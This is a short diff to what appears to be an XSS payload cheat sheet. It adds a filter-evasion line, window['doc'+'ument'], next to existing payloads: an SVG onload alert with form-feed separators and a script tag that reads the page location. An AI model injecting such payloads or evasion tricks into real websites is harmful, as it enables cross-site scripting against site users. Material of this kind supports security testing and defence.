@@ -731,6 +731,7 @@ $ echo "<svg^Lonload^L=^Lalert(1)^L>" | xxd
 
 ```javascript
 <div id = "x"></div><script>alert(x.parentNode.parentNode.parentNode.location)</script>
+window["doc"+"ument"]
 ```
 
 ### Bypass using javascript inside a string
